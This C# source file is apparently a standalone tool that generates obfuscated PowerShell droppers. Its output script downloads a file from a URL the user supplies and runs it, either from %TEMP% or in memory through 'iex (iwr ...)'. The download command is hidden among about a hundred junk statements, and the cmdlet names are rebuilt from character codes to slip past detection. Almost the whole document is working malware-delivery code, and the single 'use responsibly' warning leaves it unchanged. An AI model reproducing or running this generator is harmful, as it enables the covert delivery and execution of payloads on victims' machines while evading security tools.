using System;
using System.IO;
using System.Text;

namespace PowerShellObfuscator
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "PowerShell Obfuscator & Downloader Generator";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("╔══════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║              PowerShell Obfuscator Generator                 ║");
            Console.WriteLine("║                     By MidasRX                          ║");
            Console.WriteLine("╚══════════════════════════════════════════════════════════════╝");
            Console.ResetColor();
            Console.WriteLine();

            try
            {
                // Get URL input
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter the file URL: ");
                Console.ResetColor();
                string? url = Console.ReadLine();
                
                if (string.IsNullOrWhiteSpace(url))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: URL cannot be empty!");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                    return;
                }

                // Get filename input
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter the output filename (with extension): ");
                Console.ResetColor();
                string? filename = Console.ReadLine();
                
                if (string.IsNullOrWhiteSpace(filename))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: Filename cannot be empty!");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                    return;
                }

                // Choose execution method
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Choose execution method:");
                Console.WriteLine("1. Download to %TEMP% and execute");
                Console.WriteLine("2. Execute in memory (PowerShell scripts only)");
                Console.ResetColor();
                Console.Write("Enter choice (1 or 2): ");
                string? choice = Console.ReadLine();

                bool executeInMemory = choice == "2";
                string fileExtension = Path.GetExtension(filename).ToLower();
                
                if (executeInMemory && fileExtension != ".ps1")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Warning: In-memory execution only works with .ps1 files. Switching to temp folder execution.");
                    Console.ResetColor();
                    executeInMemory = false;
                }

                // Generate obfuscated PowerShell script
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Generating obfuscated PowerShell script...");
                Console.ResetColor();

                string obfuscatedScript = GenerateObfuscatedScript(url, filename, executeInMemory);
                
                // Save to file
                string outputPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), 
                                               $"obfuscated_downloader_{DateTime.Now:yyyyMMdd_HHmmss}.ps1");
                
                File.WriteAllText(outputPath, obfuscatedScript, Encoding.UTF8);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"✓ Obfuscated script generated successfully!");
                Console.WriteLine($"✓ Saved to: {outputPath}");
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine("Script features:");
                Console.WriteLine("• 100+ useless operations for obfuscation");
                Console.WriteLine("• Hidden payload buried in the middle");
                Console.WriteLine("• Character-based command obfuscation");
                Console.WriteLine("• One-liner format for easy copying");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("⚠️  Warning: Use responsibly and only on systems you own or have permission to test.");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        static string GenerateObfuscatedScript(string url, string filename, bool executeInMemory)
        {
            var sb = new StringBuilder();
            
            // Generate 50+ useless operations before the payload
            sb.Append(GenerateUselessOperations(50));
            
            // Add the hidden payload
            sb.Append("; ");
            if (executeInMemory)
            {
                sb.Append(GenerateInMemoryPayload(url));
            }
            else
            {
                sb.Append(GenerateTempFilePayload(url, filename));
            }
            
            // Generate 50+ more useless operations after the payload
            sb.Append("; ");
            sb.Append(GenerateUselessOperations(50));
            
            return sb.ToString();
        }

        static string GenerateUselessOperations(int count)
        {
            var operations = new[]
            {
                "$randomVar{0} = Get-Random -Minimum 1 -Maximum 1000",
                "$string{0} = \"abcdefghijklmnopqrstuvwxyz\" * 3",
                "$date{0} = Get-Date",
                "$guid{0} = [System.Guid]::NewGuid()",
                "$math{0} = [Math]::Sqrt({1}) * [Math]::PI",
                "$array{0} = @(1,2,3,4,5) | ForEach-Object {{ $_ * 2 }}",
                "$hash{0} = @{{ \"key{0}\" = \"value{0}\" }}",
                "$split{0} = \"one,two,three\".Split(',')",
                "$join{0} = @(\"a\",\"b\",\"c\") -join \"-\"",
                "$trim{0} = \"  spaces  \".Trim()",
                "$replace{0} = \"hello world\".Replace(\"world\", \"universe\")",
                "$substring{0} = \"PowerShell\".Substring(0, 5)",
                "$length{0} = \"test\".Length",
                "$check{0} = \"PowerShell\" -like \"Power*\"",
                "$case{0} = \"TEST\" -ceq \"test\"",
                "$greater{0} = {1} -gt {2}",
                "$logical{0} = ($true -and $false)",
                "$null{0} = $null -eq $null",
                "$type{0} = {1} -is [int]",
                "$cast{0} = [string]{1}",
                "$measure{0} = @(1,2,3,4,5) | Measure-Object -Sum",
                "$binary{0} = [Convert]::ToString({1}, 2)",
                "$hex{0} = [Convert]::ToString({1}, 16)",
                "$base64_{0} = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"Hello{0}\"))",
                "$memory{0} = [System.IO.MemoryStream]::new()",
                "$encoding{0} = [System.Text.Encoding]::UTF8",
                "$bytes{0} = [System.Text.Encoding]::UTF8.GetBytes(\"Test{0}\")",
                "$timer{0} = [System.Diagnostics.Stopwatch]::StartNew()",
                "$list{0} = [System.Collections.Generic.List[int]]::new()",
                "$dict{0} = [System.Collections.Generic.Dictionary[string,int]]::new()"
            };

            var sb = new StringBuilder();
            var random = new Random();
            
            for (int i = 0; i < count; i++)
            {
                var operation = operations[random.Next(operations.Length)];
                var randomNum1 = random.Next(1, 1000);
                var randomNum2 = random.Next(1, 100);
                
                if (i > 0) sb.Append("; ");
                sb.Append(string.Format(operation, i, randomNum1, randomNum2));
            }
            
            return sb.ToString();
        }

        static string GenerateInMemoryPayload(string url)
        {
            return ObfuscateCommand($"iex (iwr -Uri \"{url}\" -UseBasicParsing).Content");
        }

        static string GenerateTempFilePayload(string url, string filename)
        {
            return ObfuscateCommand($"Invoke-WebRequest -Uri \"{url}\" -OutFile \"$env:TEMP\\{filename}\"; & \"$env:TEMP\\{filename}\"");
        }

        static string ObfuscateCommand(string command)
        {
            // Split the command and obfuscate key parts
            var obfuscatedParts = new StringBuilder();
            
            // Obfuscate 'iex' or 'Invoke-Expression'
            if (command.StartsWith("iex"))
            {
                obfuscatedParts.Append("&($([char]105+[char]101+[char]120)) ");
                obfuscatedParts.Append(command.Substring(4));
            }
            else if (command.StartsWith("Invoke-WebRequest"))
            {
                // Obfuscate Invoke-WebRequest
                obfuscatedParts.Append("&($([char]73+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]87+[char]101+[char]98+[char]82+[char]101+[char]113+[char]117+[char]101+[char]115+[char]116)) ");
                obfuscatedParts.Append(command.Substring(17));
            }
            else
            {
                obfuscatedParts.Append(command);
            }
            
            return obfuscatedParts.ToString();
        }
    }
}